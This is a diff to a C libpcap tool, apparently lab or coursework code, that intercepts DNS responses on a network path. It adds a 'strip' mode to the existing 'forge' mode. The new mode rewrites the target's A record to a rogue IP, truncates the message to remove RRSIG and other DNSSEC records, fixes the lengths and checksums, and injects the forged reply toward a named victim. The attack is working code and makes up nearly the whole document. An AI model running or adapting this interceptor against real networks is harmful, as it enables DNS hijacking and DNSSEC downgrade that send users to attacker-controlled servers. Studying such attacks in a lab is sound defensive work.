@@ -12,12 +12,16 @@
  *   relay  : forward every diverted packet unchanged (transparency check)
  *   forge  : for <target> A responses, set the A rdata to <rogue-ip>; everything
  *            else, including www.<target>, is relayed untouched
+ *   strip  : for <target> A responses, drop the DNSSEC proof (RRSIG and the rest
+ *            of the message) and hand back a lone forged A pointing at <rogue-ip>.
+ *            This is the Phase 4 downgrade: make a signed answer look unsigned.
  *
- * Phase 4 (strip) and phase 6 (last-mile) extend forge_or_relay(); see the
- * PHASE4 / PHASE6 notes below.
+ * Phase 6 (last-mile) reuses forge mode with the client as the victim; see the
+ * PHASE6 note below.
  *
  * Build:  make           (needs libpcap-dev)
  * Run  :  ./dns_intercept -i eth0 -v 172.16.2.10 -t example.com -r 172.16.1.30 -m forge
+ *         ./dns_intercept -i eth0 -v 172.16.2.10 -t example.com -r 172.16.1.30 -m strip
  *
  * Uses only POSIX + libpcap (no Scapy or dnspython, per the brief).
  */
@@ -40,7 +44,8 @@ static char      g_iface[64]   = "eth0";
 static char      g_target[256] = "example.com";   /* name to hijack           */
 static uint32_t  g_rogue_ip    = 0;                /* rogue A rdata (net order)*/
 static uint32_t  g_victim_ip   = 0;                /* who the replies go to    */
-static int       g_forge       = 0;                /* 0=relay, 1=forge         */
+static int       g_forge       = 0;                /* 1=rewrite target A rdata */
+static int       g_strip        = 0;                /* 1=downgrade: forged A only*/
 static uint8_t   g_my_mac[6];                      /* attacker NIC MAC         */
 static uint8_t   g_victim_mac[6];                  /* next hop toward victim   */
 static pcap_t   *g_pcap        = NULL;
@@ -124,42 +129,50 @@ static const uint8_t *dns_skip_name(const uint8_t *end, const uint8_t *p)
 struct dnshdr { uint16_t id, flags, qd, an, ns, ar; };
 
 /*
- * forge_or_relay(): inspect/modify the DNS payload in place.
- * Returns 1 if the packet should still be forwarded, 0 to drop it.
- * For Phase 2 'forge': rewrite A rdata of the exact target name to the rogue IP.
+ * handle_dns(): inspect/modify the DNS payload in place.
+ * Returns the new payload length to forward, which may be shorter than dlen
+ * (strip mode truncates the message), or dlen unchanged for relay/forge.
+ *
+ *   forge : rewrite the A rdata of the exact target name to the rogue IP.
+ *   strip : rewrite that A and then cut the message off right after it, so the
+ *           RRSIG and every other DNSSEC record is gone. The resolver is handed
+ *           a bare, unsigned-looking A. Whether that works depends on the parent:
+ *           if com publishes a DS for the zone the resolver still demands a
+ *           signature and returns SERVFAIL (Phase 4 Run A); if com publishes no
+ *           DS the delegation is insecure and the forged A is accepted (Run B).
  */
-static int forge_or_relay(uint8_t *dns, int dlen)
+static int handle_dns(uint8_t *dns, int dlen)
 {
-    if (dlen < (int)sizeof(struct dnshdr)) return 1;
+    if (dlen < (int)sizeof(struct dnshdr)) return dlen;
     struct dnshdr *h = (struct dnshdr *)dns;
-    if (!(ntohs(h->flags) & 0x8000)) return 1;       /* only responses */
+    if (!(ntohs(h->flags) & 0x8000)) return dlen;    /* only responses */
     int qd = ntohs(h->qd), an = ntohs(h->an);
-    if (qd < 1) return 1;
+    if (qd < 1) return dlen;
 
     const uint8_t *base = dns, *end = dns + dlen;
     const uint8_t *p = dns + sizeof(struct dnshdr);
 
     /* question: read QNAME, QTYPE */
     char qname[256];
-    if (dns_read_name(base, end, &p, qname, sizeof qname) < 0) return 1;
-    if (p + 4 > end) return 1;
+    if (dns_read_name(base, end, &p, qname, sizeof qname) < 0) return dlen;
+    if (p + 4 > end) return dlen;
     uint16_t qtype = ntohs(*(uint16_t *)p);
     p += 4;                                          /* qtype + qclass */
 
     /* Only hijack the EXACT target name, type A. www.<target> is left alone. */
     if (qtype != 1 || strcasecmp(qname, g_target) != 0)
-        return 1;
+        return dlen;
 
-    if (!g_forge) return 1;                          /* relay mode: untouched */
+    if (!g_forge && !g_strip) return dlen;           /* relay mode: untouched */
 
     /* skip remaining questions (we built for qd==1 but be safe) */
     for (int i = 1; i < qd; i++) {
         p = dns_skip_name(end, p);
-        if (p + 4 > end) return 1;
+        if (p + 4 > end) return dlen;
         p += 4;
     }
 
-    /* answers: overwrite A rdata */
+    /* answers: overwrite the A rdata to point at the rogue server */
     int changed = 0;
     for (int i = 0; i < an; i++) {
         p = dns_skip_name(end, p);
@@ -171,13 +184,20 @@ static int forge_or_relay(uint8_t *dns, int dlen)
         if (type == 1 && rdlen == 4) {               /* A record */
             memcpy(rdata, &g_rogue_ip, 4);           /* -> rogue-web */
             changed = 1;
+            if (g_strip) {
+                /* downgrade: keep header + question + this one forged A, drop
+                 * everything after it (RRSIG, DNSKEY, OPT, authority glue). */
+                h->an = htons(1);
+                h->ns = 0;
+                h->ar = 0;
+                if (changed) g_forged++;
+                return (int)((rdata + 4) - dns);
+            }
         }
-        /* PHASE4 hook: here is where strip mode would drop RRSIG(46)/DNSKEY(48)
-         * records and rewrite the header counts for a downgrade. */
         p = rdata + rdlen;
     }
     if (changed) g_forged++;
-    return 1;
+    return dlen;
 }
 
 static void on_packet(u_char *user, const struct pcap_pkthdr *hdr,
@@ -204,15 +224,23 @@ static void on_packet(u_char *user, const struct pcap_pkthdr *hdr,
     if (dlen <= 0) return;
 
     g_seen++;
-    int forward = forge_or_relay(dns, dlen);
-    if (!forward) return;
+    int newdlen = handle_dns(dns, dlen);
+    if (newdlen < 0) return;
+
+    /* strip mode can shorten the payload: fix UDP + IP lengths to match */
+    int new_udp_len = (int)sizeof(struct udphdr) + newdlen;
+    if (newdlen != dlen) {
+        udp->uh_ulen = htons((uint16_t)new_udp_len);
+        ip4->ip_len  = htons((uint16_t)(ihl + new_udp_len));
+    }
 
     /* relay toward the victim: our MAC -> victim MAC, recompute checksums */
     memcpy(eth->ether_shost, g_my_mac, 6);
     memcpy(eth->ether_dhost, g_victim_mac, 6);
-    fix_checksums(ip4, udp, udp_len);
+    fix_checksums(ip4, udp, new_udp_len);
 
-    if (pcap_inject(g_pcap, buf, hdr->caplen) < 0)
+    int caplen = (int)sizeof(struct ether_header) + ihl + new_udp_len;
+    if (pcap_inject(g_pcap, buf, caplen) < 0)
         fprintf(stderr, "inject failed: %s\n", pcap_geterr(g_pcap));
     else
         g_relayed++;
@@ -266,11 +294,12 @@ int main(int argc, char **argv)
         case 'r': rogue = optarg; break;
         case 'm': mode = optarg; break;
         default:
-            fprintf(stderr, "usage: %s -i IFACE -v VICTIM_IP -t NAME -r ROGUE_IP -m relay|forge\n", argv[0]);
+            fprintf(stderr, "usage: %s -i IFACE -v VICTIM_IP -t NAME -r ROGUE_IP -m relay|forge|strip\n", argv[0]);
             return 2;
         }
     }
     g_forge = (strcmp(mode, "forge") == 0);
+    g_strip = (strcmp(mode, "strip") == 0);
     g_victim_ip = inet_addr(victim);
     g_rogue_ip  = inet_addr(rogue);
 
@@ -301,7 +330,8 @@ int main(int argc, char **argv)
 
     signal(SIGINT, stop); signal(SIGTERM, stop);
     fprintf(stderr, "[intercept] iface=%s mode=%s target=%s rogue=%s victim=%s\n",
-            g_iface, g_forge ? "FORGE" : "relay", g_target, rogue, victim);
+            g_iface, g_strip ? "STRIP" : g_forge ? "FORGE" : "relay",
+            g_target, rogue, victim);
     fprintf(stderr, "[intercept] filter: %s\n", filter);
 
     pcap_loop(g_pcap, -1, on_packet, NULL);
